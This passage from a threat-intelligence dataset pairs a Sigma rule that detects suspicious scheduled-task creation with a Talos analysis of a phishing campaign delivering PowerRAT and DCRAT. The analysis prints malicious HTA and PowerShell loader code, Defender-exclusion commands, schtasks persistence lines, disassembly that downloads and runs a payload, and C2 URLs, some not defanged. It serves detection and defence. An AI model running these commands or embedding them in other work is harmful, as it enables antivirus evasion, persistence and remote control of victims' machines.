T1588.005 | Obtain Capabilities: Exploits                                                                    | Donot Team has used CVE‑2017-11882 exploits to run its first-stage malware.                                            |\n| Initial Access       | T1566.001 | Phishing: Spearphishing Attachment                                                               | Donot Team has sent spearphishing emails to its victims with malicious Word or PowerPoint attachments.                 |\n| Execution            | T1204.002 | User Execution: Malicious File                                                                   | Donot Team has lured its victims into opening malicious email attachments.                                             |\n| Persistence          | T1053.005 | Scheduled Task/Job: Scheduled Task                                                               | Donot Team has created scheduled tasks for persistence of its malicious components.                                    |\n| Defense Evasion      | T1036.005 | Masquerading: Match Legitimate Name or Location                                                  | Donot Team has used filenames such as `pytemp` or `javatemp` to approximate the name of legitimate software.           |\n| Discovery            | T1057     | Process Discovery                                                                                | Donot Team has implemented checks for older versions of the malware running on the victim’s system.                    |\n| Lateral Movement     | T1534     | Internal Spearphishing                                                                           | Donot Team has sent spearphishing emails to their victims that came from within the same targeted organization.        |\n| Collection           | T1005     | Data from Local System                                                                           | Donot Team has used malicious modules that traverse the victim’s filesystem looking for files with various extensions. |\n| Command and Control  | T1071.001 | Application Layer Protocol: Web Protocols                                                        | Donot Team has used HTTP/S for C&C communications and data exfiltration.                                               |\n| Exfiltration         | T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol | Donot Team has used dedicated servers for exfiltration, sending the data over HTTP or HTTPS, unencrypted.              |",
    "sigma_rule": {
      "title": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
      "id": "81325ce1-be01-4250-944f-b4789644556f",
      "related": [
        {
          "id": "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
      "references": [
        "https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/",
        "https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04",
        "https://blog.talosintelligence.com/gophish-powerrat-dcrat/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-21",
      "modified": "2024-10-28",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1_create": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": " /create "
        },
        "selection_1_all_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Users\\All Users\\",
            ":\\Users\\Default\\",
            ":\\Users\\Public",
            ":\\Windows\\Temp",
            "\\AppData\\Local\\",
            "\\AppData\\Roaming\\",
            "%AppData%",
            "%Public%"
          ]
        },
        "selection_2_parent": {
          "ParentCommandLine|endswith": "\\svchost.exe -k netsvcs -p -s Schedule"
        },
        "selection_2_some_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Windows\\Temp",
            "\\Users\\Public",
            "%Public%"
          ]
        },
        "filter_optional_other": [
          {
            "ParentCommandLine|contains": "unattended.ini"
          },
          {
            "CommandLine|contains": "update_task.xml"
          }
        ],
        "filter_optional_team_viewer": {
          "CommandLine|contains": "/Create /TN TVInstallRestore /TR"
        },
        "filter_optional_avira_install": {
          "CommandLine|contains|all": [
            "/Create /Xml \"C:\\Users\\",
            "\\AppData\\Local\\Temp\\.CR.",
            "Avira_Security_Installation.xml"
          ]
        },
        "filter_optional_avira_other": {
          "CommandLine|contains|all": [
            "/Create /F /TN",
            "/Xml ",
            "\\AppData\\Local\\Temp\\is-",
            "Avira_"
          ],
          "CommandLine|contains": [
            ".tmp\\UpdateFallbackTask.xml",
            ".tmp\\WatchdogServiceControlManagerTimeout.xml",
            ".tmp\\SystrayAutostart.xml",
            ".tmp\\MaintenanceTask.xml"
          ]
        },
        "filter_optional_klite_codec": {
          "CommandLine|contains|all": [
            "\\AppData\\Local\\Temp\\",
            "/Create /TN \"klcp_update\" /XML ",
            "\\klcp_update_task.xml"
          ]
        },
        "condition": "( all of selection_1_* or all of selection_2_* ) and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Benign scheduled tasks creations or executions that happen often during software installations",
        "Software that uses the AppData folder and scheduled tasks to update the software in the AppData folders"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_env_folder.yml",
    "id": "474"
  },
  {
    "url": "https://blog.talosintelligence.com/gophish-powerrat-dcrat/",
    "markdown": "# Threat actor abuses Gophish to deliver new PowerRAT and DCRAT\n\nOctober 22\n\n**Categories:** RAT, Threats\n\n---\n\n- Cisco Talos recently discovered a phishing campaign using an open-source phishing toolkit called Gophish by an unknown threat actor.\n- The campaign involves modular infection chains that are either Maldoc or HTML-based infections and require the victim’s intervention to trigger the infection chain.\n- Talos discovered an undocumented PowerShell RAT we’re calling PowerRAT, as one of the payloads and another infamous Remote Access Tool (RAT) DCRAT.\n- We found a few placeholders for base64 encoded PowerShell scripts in the PowerRAT, indicating that the threat actor is actively developing their tools.\n\n## Victimology\n\nTalos assesses with high confidence that the threat actor is targeting Russian-speaking users based on the language used in the Phishing emails, luring contents of Malicious documents, a masqueraded HTML webpage of Vkontake (VK), a popular social media application amongst Russian speakers, especially in Russia, Ukraine, Belarus, Kazakhstan, Uzbekistan, and Azerbaijan.\n\n| **Targeted Regions** |\n|----------------------|\n| Russia               |\n| Ukraine              |\n| Belarus              |\n| Kazakhstan           |\n| Uzbekistan           |\n| Azerbaijan           |\n\n## Actor uses Gophish to send phishing emails\n\nOur analysis of the malicious hyperlinks embedded in the phishing emails disclosed to us the attacker-controlled hosting domains `disk-yanbex[.]ru` delivered the Malicious Microsoft Word document, and an HTML file embedded with the malicious JavaScript.\n\nThe domain `disk-yanbex[.]ru` resolves to the IP address `34[.]236[.]234[.]165`, an AWS EC2 instance with the fully qualified domain name `ec2-34-236-234-165[.]compute-1[.]amazonaws[.]com`, during our analysis. We also observed that the same server `34[.]236[.]234[.]165` was reverse resolving to another domain `e-connection[.]ru`, which also delivered malicious JavaScript-embedded HTML files. Our further analysis of the server `34[.]236[.]234[.]165` disclosed to us that the actor hosted the Gophish toolkit on the server running at port number 3333. Gophish is an Open-Source easy-to-deploy phishing toolkit that is developed to conduct security awareness training according to the tool’s developer.\n\n```image\nAlt: Attacker hosting Gophish.\nDescription: The image displays a login page for Gophish, an open-source phishing toolkit. The interface shows a prompt asking for a username and password, with a 'Sign in' button. The URL in the browser indicates that the login page is hosted on an AWS EC2 instance with the IP address `34.236.234.165` at port 3333. The design includes a logo resembling a fishing hook, reinforcing the phishing theme.\nTranscription: |\n  Gophish - Login\n  \n  Please sign in\n  \n  Username\n  Password\n  \n  Sign in\n```\n\nTalos analysis of the phishing email sample’s header showed us that the email was first delivered from server `34[.]236[.]234[.]165`, indicating that the threat actor is misusing the Gophish framework in this campaign to deliver phishing emails to their targets.\n\n```image\nAlt: Sample Phishing email header.\nDescription: The image displays a screenshot of a phishing email header analysis. It captures detailed SMTP information regarding the email's delivery path, including timestamps, server IPs, and encryption details. The highlighted section shows that the email was received from an EC2 instance associated with the IP address 34.236.234.165, indicating that the threat actor is utilizing this server for their phishing activities. The header reveals the email's origin and the servers involved in its transmission, which is crucial for understanding the phishing attack's infrastructure.\nTranscription: |\n  Received: from VDC01-PEEXCH-08.tn.tngrp.ru (10.5.112.25)\n          by VDC01-PEEXCH-08.tn.tngrp.ru (10.5.112.20) with Microsoft SMTP Server\n          (version=TLS1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id\n          15.2.1118.40 via Mailbox Transport; Thu, 1 Aug 2024 09:42:15 +0300\n  Received: from VDC01-PEEXCH-04.tn.tngrp.ru (10.5.112.21)\n          by VDC01-PEEXCH-08.tn.tngrp.ru (10.5.112.25) with Microsoft SMTP Server\n          (version=TLS1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id\n          15.2.1118.40; Thu, 1 Aug 2024 09:42:14 +0300\n  Received: from VDC01-PEPMVTI01.TN.TNGRP.RU (VDC01-PEPMVTI01)\n          by VDC01-PEMSR04.TN.TNGRP.RU (Postfix) with ESMTPS id D74A18000A;\n          Thu, 1 Aug 2024 09:42:14 +0300 (MSK)\n  Received: from mysap.dc-prod.tn.corp (vdc01-dzpfpt-02.dc-prod.tn.corp [10.7.95.145])\n          by VDC01-PEPMVTI01.TN.TNGRP.RU (Postfix) with ESMTPS id D1B318002CF\n          for <transfer@tak.transnet.ru>; Thu, 1 Aug 2024 09:42:14 +0300 (MSK)\n  Received: from vdc01-dzpfpt-02.dc-prod.tn.corp (localhost [127.0.0.1])\n          by mysap.dc-prod.tn.corp (Postfix) with ESMTP id CA065C0008\n          for <transfer@tak.transnet.ru>; Thu, 1 Aug 2024 09:42:10 +0300 (MSK)\n  Received: from mail.minenergo.com.ru (mail.minenergo.com.ru [147.45.164.199])\n          by mysap.dc-prod.tn.corp (Postfix) with ESMTPS\n          id A5256-GCM-SHA384 (256/256 bits))\n          for <transfer@tak.transnet.ru>; Thu, 1 Aug 2024 09:42:10 +0300 (MSK)\n  Received: from ec2-34-236-234-165.compute-1.amazonaws.com ([34.236.234.165] helo=ip-172-31-23-243)\n          by mail.minenergo.com.ru with esmtps (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n          (Exim 4.93)\n          (envelope-from <minenergo@minenergo.com.ru>)\n          id 1zPvr-001cn8-LZ\n          for transfer@tak.transnet.ru; Thu, 01 Aug 2024 09:42:11 +0300\n  From: =?utf-8?B?Q3V0YQ==?= <novas@minenergo.com.ru>\n  To: =?utf-8?B?Q2F0aW5hQ2luY0l0YQ==?= <transfer@tak.transnet.ru>\n  Subject: =?utf-8?B?Q1V0YQ==?= <transfer@tak.transnet.ru>\n```\n\n## Multi-modular Campaign delivers PowerRAT and DCRAT\n\nThe campaign has two initial attack vectors, one based on malicious Word documents and another based on HTML files containing malicious JavaScript. Upon activation, these would lead to the download and activation of PowerRAT or DCRAT depending on the initial vector. Both the attack chains require user intervention to trigger the infections on the compromised machines.\n\n```image\nAlt: Multi-modular Campaign\nDescription: The image is a flowchart titled \"Campaign overview\" that outlines the process of a cyber attack campaign. It begins with a \"Phishing Email\" leading to a \"User Clicks\" action, which directs to a \"Malicious Link.\" The flowchart details that this link leads to a hosting server that downloads either a \"Malicious HTML\" or a \"Maldoc.\" The flow further indicates that the malicious HTML leads to a DCRAT payload, while the Maldoc leads to a PowerRAT payload. Each payload is connected to command and control (C2) servers, with specific IP addresses listed for both the DCRAT and PowerRAT payloads.\nTranscription: |\n  Campaign overview\n  \n  Phishing Email → User Clicks → Malicious Link → Hosting server\n  34.236.234.165\n  disk-yanbex.ru\n  e-connection.ru\n         ↓\n      Downloads\n         ↓\n  Malicious HTML → Payload → DCRAT\n         ↓\n        C2\n  Strepsils.top\n  cr87986.tw1.ru\n  \n         ↓\n      Downloads\n         ↓\n      Maldoc → Payload → PowerRAT\n         ↓\n        C2\n  94.103.85.47\n  5.252.176.55\n```\n\n## Maldoc-based infection delivers PowerRAT\n\nWhen a victim opens the Microsoft Word document and enables the view contents button displayed in the document banner, the malicious VB macro program executes.\n\n```image\nAlt: Malicious VB Macro\nDescription: The image depicts a flowchart illustrating the 'Maldoc-based Infection chain.' It shows the step-by-step process starting from a malicious document (Maldoc) that contains a VB Macro. The flowchart highlights various actions such as writing and dropping files, executing a PowerShell loader, and ultimately leading to the execution of PowerRAT. Additionally, it includes references to the AutoRun LOAD registry key and the communication with command and control (C2) servers, providing a clear representation of the infection process.\nTranscription: |\n  Maldoc-based Infection chain\n  \n  Maldoc\n     |\n     v\n  VB Macro\n     |\n     | Writes\n     |\n     v\n  AutoRun LOAD registry key\n     |\n     | Executes\n     |\n     v\n  Victim logins to the machine\n     |\n     | Drops\n     |\n     v\n  Malicious HTA UserCache.ini.hta\n     |\n     | Executes\n     |\n     v\n  PowerShell Loader decrypts UserCache.ini\n     |\n     | Executes\n     |\n     v\n  PowerRAT\n     |\n     |\n     v\n  C2 Server\n     |\n     | 94.103.85.47\n     | 5.252.176.55\n```\n\nThe macro program initially executes a function that decodes or translates specific encoded symbols in the lure contents of the Word document into their corresponding characters from another alphabet in Cyrillic, transforming the lure contents into readable form.\n\nWe spotted a base64 encoded data blob on the third page of the Word document and the actor used the text color the same as that of the document's default background color, hiding them from the victim’s view.\n\n```image\nAlt: Base64 Encoded Data\nDescription: The image depicts a screenshot of the third page of a Microsoft Word document. It contains a base64 encoded data blob highlighted with the search terms 'DigitalRSASignature:' and 'CHECKSUM' in orange boxes. The text appears in a mix of Cyrillic and Latin characters, showcasing the encoded payload that the malicious VB macro is designed to search for and process. The layout includes a header indicating the content's context regarding the encoded data, and the encoded string itself is displayed in a long block beneath the highlighted search terms.\nTranscription: |\n  Document page 3 contining the encoded data blob with the search terms DigitalRSASignature: and CHECKSUM\n  \n  DigitalRSASignature: PGhObWw+DQo8SFRBokFQUExJQ0FUUS9OIGjb249iTiMiFdJtRkPV1NUQVRFPSJtaW5pWl6ZIg0...\n```\n\nTo identify the hidden encoded data, the macro executes a function that searches for specific strings such as “DigitalRSASignature:” and “CHECKSUM” in the content section of the Word document, and when found, it copies the data following the search strings to an array.\n\nTo decode the base64 encoded data blob, the actor uses a custom function called `CheckContent()` in the macro. It removes any “=” characters which are the padding characters in the encoded data blob and decodes them into two parts in a byte array. The first part is the contents of a malicious HTML application (HTA) file and the second is a PowerShell loader.\n\nThe macro drops the decoded contents of the malicious HTA file to `UserCache.ini.hta` and the PowerShell loader into `UserCache.ini` in the victim machine's current user profile folder.\n\nThe actor has abused the Windows NT current version autorun registry key called “LOAD”. The registry key `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\LOAD` is used by Windows to automatically launch applications or processes when a user logs into their account. Specifically, this key stores information about programs that are set to load upon user login. It works similarly to other startup mechanisms in Windows (such as the Startup folder or the Run registry keys), but this specific key is less commonly used. The macro after dropping the malicious HTA and the PowerShell loader script in the victim machine user profile folder, it configures the registry key `HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\LOAD` with the value `C:\\Users\\<Username>\\UserCache.ini.hta`.\n\nFinally, the macro checks if there are any headers in the Word documents and deletes the contents of the headers from all sections of the Word document.\n\n## Intermediate phase includes Malicious HTA, JavaScript, and PowerShell Loader\n\nThe malicious HTA `UserCache.ini.hta` is executed through the LOAD registry key when a victim logs into the machine. It drops a JavaScript called `UserCacheHelper.lnk.js` in the victim machine user profile folder and writes a single line code embedding with a PowerShell command to execute the dropped PowerShell Loader masquerading as `UserCache.ini` file. The HTA file executes the JavaScript `UserCacheHelper.lnk.js` using the LOLbin `cscript.exe`.\n\n```image\nAlt: Sample of malicious HTA file.\nDescription: The image displays a snippet of malicious HTA (HTML Application) code. It includes JavaScript that defines variables and executes commands to interact with the Windows PowerShell environment. The code is designed to retrieve a JavaScript file named `UserCacheHelper.lnk.js` and execute it using `cscript.exe`. It highlights the use of `Invoke-Expression` to run content from a path derived from the user profile, indicating its malicious intent to load additional payloads.\nTranscription: |\n  html\n  <HTA:APPLICATION icon=\"#\" WINDOWSTATE=\"minimize\" SHOWINTASKBAR=\"no\" SYSMENU=\"no\" CAPTION=\"no\" />\n  <body>\n  <script>\n  var dig = 0;\n  var shell = new ActiveXObject(\"Shell.Application\");\n  var args = \"/c echo new ActiveXObject(\\\"Shell.Application\\\").ShellExecute(\";\n  switch (shell.NameSpace(\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\")) {\n  case null:\n      args = args + \"\\\"powershell.exe\\\"\";\n      break;\n  default:\n      args = args + \"\\\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"\";\n  }\n  var userProfile = \"C:\\\\Users\\\\ROLEX\\\\\";\n  var userProfileDouble = userProfile.replace(/\\\\/g, \"\\\\\\\\\");\n  args = args + \", \\\"-\" + \"$raw= Get-Content -Path \" + userProfileDouble + \"UserCacheHelper.lnk.js;Invoke-Expression $raw\\\\\\\"\\\", \\\"\\\", \\\"open\\\", dig\";\n  shell.ShellExecute(\"cmd.exe\", args, \"\", \"open\", dig);\n  var user = shell.NameSpace(0x28);\n  shell.ShellExecute(userProfile + 'UserCacheHelper.lnk.js', '', 'open', dig);\n  </script>\n  <script>\n  self.close();\n  </script>\n  </body>\n  </html>\n  \n  (new ActiveXObject(\"Shell.Application\")).ShellExecute(\"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"-c \"$raw= Get-Content -Path C:\\\\Users\\\\ROLEX\\\\UserCache.ini;Invoke-Expression $raw\"\", \"\", \"open\", 0)\n```\n\nThe dropped JavaScript `UserCacheHelper.lnk.js` loads the contents of the `UserCache.ini` and executes it using the `Invoke-Expression` PowerShell command. The PowerShell Loader script masquerading as the INI file contains base64 encoded data blob of the payload PowerRAT, which decodes and executes in the victim’s machine memory.\n\n```image\nAlt: Sample PowerShell Loader script embedded with PowerRAT.\nDescription: The image displays a snippet of a PowerShell script that includes a base64 encoded string. The script uses the System.Convert class to decode the base64 string and execute it using the Invoke-Expression command (iex). The highlighted portion indicates the specific encoded data being decoded, which is likely related to the PowerRAT payload described in the context. This script is part of a malicious operation as outlined in the surrounding text.\nTranscription: |\n  $base = \"W2VudWlyb25tZW50ZXJlcmVpcmVjb21pxleHRpb25zY29tcGxleHRpb25zY29tcGxleHRpb25zY2...\n```\n\n## PowerRAT expands the attack vector for further infections\n\nTalos discovered a new PowerShell remote access tool as one of the payloads in this campaign we are calling PowerRAT that executes in the victim’s machine memory. It has the functionality of executing other PowerShell scripts or commands as directed by the C2 server, enabling the attack vector for further infections on the victim machine.\n\nThe PowerRAT that executes in the victim machine memory initially checks if the JavaScript `UserCacheHelper.lnk.js` exists in the user profile folder and if not found, it will reinfect the victim machine by performing the actions of the PowerShell loader script described in the previous section. Then it hides the `UserCache.ini` by modifying the file attributes to “Hidden”.\n\nThe PowerRAT performs reconnaissance on the victim’s machine by executing a function `GetID()` which collects the username, computer name, and the system driver letter through the PowerShell command `Get-CimInstance`. It also collects the drive serial number through the `win32_volume` class of `WMIobject`. The collected data is written to memory in the format `<Computername_Username_drive serial number>`.\n\nAfter performing the reconnaissance, the PowerRAT attempts to connect to the C2 server by sending the collected data of the victim’s machine using a hardcoded URL through the HTTP GET method. The C2 servers identified in this campaign are `94[.]103[.]85[.]47` located in Russia with the ASN 48282 of Hosting Technology LTD and `5[.]252[.]176[.]55` also geographically located in Russia with the ASN 39798 of MivoCloud SRL.\n\nWhen there is no response from the C2 server, the PowerRAT has a placeholder function called `offlineworker()` that has the functionality to decode an embedded base64 encoded string of a PowerShell script and executes it using the `Invoke-Expression` command. The actor has built this functionality to keep the infection alive in the victim machine even if the victim's environment detects the malicious C2 traffic and blocks the connection. We didn’t see any embedded base64 encoded strings in the PowerRAT sample that we analyzed and is likely a placeholder, indicating that the actor is actively developing and updating their tools.\n\nThe PowerRAT generates a random number between 7 - 23 and pauses its execution for (300 + random number) seconds and re-attempts to connect to the C2 server continuously waiting for a response. During our analysis, the C2 servers were not responding, and still, our further analysis of the PowerRAT showed us that the C2 server will likely respond with an XML configuration file having multiple modules with embedded base64 encoded PowerShell commands or scripts.\n\nThe PowerRAT has the functionality to parse the received XML file and search for the sections called `config`. It periodically executes the embedded encoded PowerShell commands or scripts, according to their defined intervals and run limits. The PowerRAT continues to run until all commands or scripts in the config sections are executed the required number of times.\n\n## HTML-based infection delivers DCRAT\n\nTalos discovered that the threat actor is also using HTML files embedded with malicious JavaScript in this campaign that are delivered to the victims through the malicious links in the phishing email, leading to the infection of the DCRAT payload.\n\nWhen a victim clicks on the malicious link in the phishing email, a remotely located HTML file containing the malicious JavaScript opens in the victim machine’s browser and simultaneously executes the JavaScript. The JavaScript has a base64 encoded data blob of a 7-ZIP archive of a malicious SFXRAR executable. It decodes the embedded base64 encoded data blob into binary data blob with the type “application/octet-stream” in the memory. A download URL for the binary data blob is created using the `URL.createObjectURL()` method and assigned to a variable in memory. It calls the `click()` method on the URL of the binary data blob which triggers the download of the binary data to a 7-Zip archive file. The malicious 7-Zip archive masquerades as the VK messenger application archive file in one of the malicious HTML files and another with a Russian name. The actor is using this technique in the JavaScript function to masquerade as the actual download activity of a file over the internet through a browser.\n\nA victim must inflate the 7-Zip archive manually to run the SFXRAR executable which is masquerading as the legitimate VK application executable which leads to DCRAT infection. The SFX RAR executable is packaged with the malicious loader or dropper executables, batch file, and a decoy document in some samples.\n\nWhen a victim runs the SFX executable, the SFX script drops the packaged files into a folder and executes the batch file which runs another password-protected SFXRAR with the hardcoded password “riverdD” and runs the DCRAT.\n\nIn another sample, we observed that the SFXRAR drops the GOLoader and the decoy document Excel spreadsheet in the victim machine user profile applications temporary folder and runs the GOLoader along with opening the decoy document.\n\nTalos observed an overlap of the technique used by the threat actor in this campaign with an earlier SparkRAT attack reported by Hunt researchers in April 2024, indicating that SparkRAT is another payload in the threat actor’s arsenal.\n\n## GOLoader downloads and runs the DCRAT\n\nIn DCRAT infection, the SFX script runs a malicious Loader executable and simultaneously opens a decoy document. The malicious loader executable we are calling “GOLoader” is compiled in Golang. It modifies the configuration settings for Microsoft Defender Antivirus, specifically by excluding the root directory `C:\\` and the folder `C:\\Users\\$user\\Desktop` in the victim machine by executing the PowerShell commands.\n\n| **PowerShell Commands**                                                        |\n|--------------------------------------------------------------------------------|\n| `powershell -Command Add-MpPreference -ExclusionPath 'C:\\Users\\$user\\Desktop'` |\n| `powershell -Command Add-MpPreference -ExclusionPath 'C:\\'`                    |\n\nAfter configuring the exclusion paths, the GOLoader downloads the DCRAT binary data stream from a remote location through a hardcoded URL and writes it into a dropped executable with the file name `file.exe` in the desktop folder on the victim’s machine. During our analysis, we found that the remote location URL hardcoded in the GOLoader was pointing to a GitHub repository, which was not accessible. However, we found that the hosted payload binary in the GitHub repository is the Dark Crystal RAT (DCRAT) binary based on open-source intelligence data.\n\n```image\nAlt: DCRAT Payload\nDescription: The image displays a snippet of assembly or machine code related to the GOLoader executable discussed in the context of the DCRAT infection. It includes various instructions that indicate the process of accessing user environment variables, manipulating file paths, and preparing to execute a command. The specific operations involve loading and modifying pointers, as well as calling functions related to file handling and execution, ultimately suggesting an operation to download and execute a malicious payload.\nTranscription: |\n  mov     qword ptr [rsp+88h+var_20+8], rbx\n  mov     qword ptr [rsp+88h+var_20], rax\n  mov     rcx, aDesktop          ; \"Desktop\"\n  mov     ebx, 2\n  rcx, rbx\n  call    path_filepath_join\n  main_jtkadw\n  rax, ac_24                    ; \"C:\\\\\"\n  ebx, 3\n  main_jtkadw\n  eax, 3000000000\n  time_Sleep\n  ebx, aUserprofile            ; \"USERPROFILE\"\n  os_Getenv\n  movups  [rsp+88h+var_50], xmm15\n  movups  [rsp+88h+var_40], xmm15\n  movups  [rsp+88h+var_30], xmm15\n  mov     qword ptr [rsp+88h+var_50], rbx\n  mov     qword ptr [rsp+88h+var_40+8], 7\n  lea     rcx, [rsp+88h+var_20]\n  mov     ebx, 3\n  mov     qword ptr [rsp+88h+var_40], rcx\n  mov     rcx, [rsp+88h+var_30+8], 8\n  qword ptr [rsp+88h+var_30], rcx\n  ebx, 3\n  nop\n  dword ptr [rax+0h]\n  call    path_filepath_join\n  mov     qword ptr [rsp+88h+var_58], rax\n  mov     qword ptr [rsp+88h+var_60], rbx\n  mov     rcx, rax\n  lea     rax, httpsGithubCom ; https://github.com/MrBrounr/main/raw/main/naker.exe\n  eax, 33h                     ; '3'\n  call    main_lkajs\n  rax, [rsp+88h+var_58]\n  mov     [rsp+88h+var_60], rbx\n  eax, ebx\n  xor     rsi, rdi\n  mov     dword ptr [rax+0h]\n  call    os_exec_Command\n```\n\n## Threat actor delivers DCRAT\n\nThe payload Dark Crystal RAT (DCRAT) sample that we analyzed in this campaign is a modular RAT associated with plugins to perform the DLL injection and information stealing tasks.\n\nKey features of the DCRAT sample of this campaign include:\n\n- Provides remote control access to the victim machine to the actor who can execute arbitrary commands, manage files, and monitor user activities.\n- It has the capability of downloading and executing other files on the victim's machine.\n- With its stealer plugin modules, the RAT can steal sensitive information including credentials, files, and financial information from the victim's machine.\n- The RAT can take screenshots and capture the keystrokes on the victim's machine.\n- We found that the RAT creates multiple copies of its binary masquerading as legitimate Windows executables including `csrss.exe`, `dllhost.exe`, `taskhostw.exe`, and `winlogon.exe` in the folders such as ProgramData, Pictures, Saved Games, and Windows start menu. It drops the embedded modules in the administrator user desktop folder using random file names and with the `.log` file extension.\n\n| **File Paths**                                                                |\n|-------------------------------------------------------------------------------|\n| `C:\\Users\\admin\\Desktop\\zaHrebVC.log`                                         |\n| `C:\\Users\\admin\\Desktop\\HQLYdHol.log`                                         |\n| `C:\\Users\\admin\\Desktop\\qJutJUJW.log`                                         |\n| `C:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\taskhostw.exe` |\n| `C:\\ProgramData\\dllhost.exe`                                                  |\n| `C:\\Users\\Default\\Pictures\\csrss.exe`                                         |\n| `C:\\Users\\Default\\Saved Games\\winlogon.exe`                                   |\n\n- It establishes persistence on the victim machine by creating several Windows tasks to run at different intervals or during the Windows login process.\n\n### Task Scheduler Commands\n\n| **Command**                                                                                                                |\n|----------------------------------------------------------------------------------------------------------------------------|\n| `schtasks.exe /create /tn \"winlogonw\" /sc MINUTE /mo 11 /tr \"'C:\\Users\\Default\\Saved Games\\winlogon.exe'\" /f`              |\n| `schtasks.exe /create /tn \"winlogon\" /sc ONLOGON /tr \"'C:\\Users\\Default\\Saved Games\\winlogon.exe'\" /rl HIGHEST /f`         |\n| `schtasks.exe /create /tn \"winlogonw\" /sc MINUTE /mo 5 /tr \"'C:\\Users\\Default\\Saved Games\\winlogon.exe'\" /rl HIGHEST /f`   |\n| `schtasks.exe /create /tn \"csrssc\" /sc MINUTE /mo 12 /tr \"'C:\\Users\\Default\\Pictures\\csrss.exe'\" /f`                       |\n| `schtasks.exe /create /tn \"csrss\" /sc ONLOGON /tr \"'C:\\Users\\Default\\Pictures\\csrss.exe'\" /rl HIGHEST /f`                  |\n| `schtasks.exe /create /tn \"csrssc\" /sc MINUTE /mo 7 /tr \"'C:\\Users\\Default\\Pictures\\csrss.exe'\" /rl HIGHEST /f`            |\n| `schtasks.exe /create /tn \"dllhostd\" /sc MINUTE /mo 11 /tr \"'C:\\Users\\Public\\dllhost.exe'\" /f`                             |\n| `schtasks.exe /create /tn \"dllhost\" /sc ONLOGON /tr \"'C:\\Users\\Public\\dllhost.exe'\" /rl HIGHEST /f`                        |\n| `schtasks.exe /create /tn \"dllhostd\" /sc MINUTE /mo 12 /tr \"'C:\\Users\\Public\\dllhost.exe'\" /rl HIGHEST /f`                 |\n| `schtasks.exe /create /tn \"dllhostd\" /sc MINUTE /mo 8 /tr \"'C:\\Users\\All Users\\dllhost.exe'\" /f`                           |\n| `schtasks.exe /create /tn \"dllhost\" /sc ONLOGON /tr \"'C:\\Users\\All Users\\dllhost.exe'\" /rl HIGHEST /f`                     |\n| `schtasks.exe /create /tn \"dllhostd\" /sc MINUTE /mo 11 /tr \"'C:\\Users\\All Users\\dllhost.exe'\" /rl HIGHEST /f`              |\n| `schtasks.exe /create /tn \"taskhostwt\" /sc MINUTE /mo 6 /tr \"'C:\\Users\\Default\\Start Menu\\taskhostw.exe'\" /f`              |\n| `schtasks.exe /create /tn \"taskhostw\" /sc ONLOGON /tr \"'C:\\Users\\Default\\Start Menu\\taskhostw.exe'\" /rl HIGHEST /f`        |\n| `schtasks.exe /create /tn \"taskhostwt\" /sc MINUTE /mo 10 /tr \"'C:\\Users\\Default\\Start Menu\\taskhostw.exe'\" /rl HIGHEST /f` |\n| `schtasks.exe /create /tn \"filef\" /sc MINUTE /mo 13 /tr \"'C:\\Users\\admin\\AppData\\Local\\Temp\\file.exe'\" /f`                 |\n| `schtasks.exe /create /tn \"file\" /sc ONLOGON /tr \"'C:\\Users\\admin\\AppData\\Local\\Temp\\file.exe'\" /rl HIGHEST /f`            |\n| `schtasks.exe /create /tn \"filef\" /sc MINUTE /mo 9 /tr \"'C:\\Users\\admin\\AppData\\Local\\Temp\\file.exe'\" /rl HIGHEST /f`      |\n\n- The RAT communicates to the C2 server through a URL hardcoded in the RAT configuration file as shown in the picture and exfiltrates the sensitive data collected from the victim machine. From other DCRAT samples identified in this campaign, we found another C2 URL `hxxp[://]cr87986[.]tw1[.]ru/L1nc0In[.]php`.\n\n```image\nAlt: Sample of DCRAT configuration file.\nDescription: The image is a screenshot of a configuration file related to a Remote Access Trojan (RAT). It displays JSON data that includes a Command and Control (C2) server URL, plugin configurations with boolean values, and version information. The C2 URL is listed at the top, followed by options for plugin configs, indicating various settings for the RAT's operation. The structure of the JSON is consistent with configurations used in malicious software, highlighting its purpose in cyber threats.\nTranscription: |\n  json\n  {\n    \"C2\": [\n      \"http://strepsils.top/VideoVm_requestMultiTestLocal.php\"\n    ],\n    \"Options\": {\n      \"PluginConfigs\": {\n        \"0\": \"{$SYSTEMDRIVE}/Users/\",\n        \"1\": \"false\",\n        \"2\": \"false\",\n        \"3\": \"true\",\n        \"4\": \"true\",\n        \"5\": \"true\",\n        \"6\": \"true\",\n        \"7\": \"false\",\n        \"8\": \"true\",\n        \"9\": \"true\",\n        \"10\": \"true\",\n        \"11\": \"true\",\n        \"12\": \"true\",\n        \"13\": \"true\",\n        \"14\": \"true\"\n      }\n    },\n    \"Version\": \"5.0.1\",\n    \"Plugins\": ...\n```\n\n## Coverage\n\n```image\nAlt: Coverage\nDescription: The image is a table listing various Cisco security products along with their functionalities and features. Each product is associated with a check mark indicating its capabilities regarding malware protection and security measures. 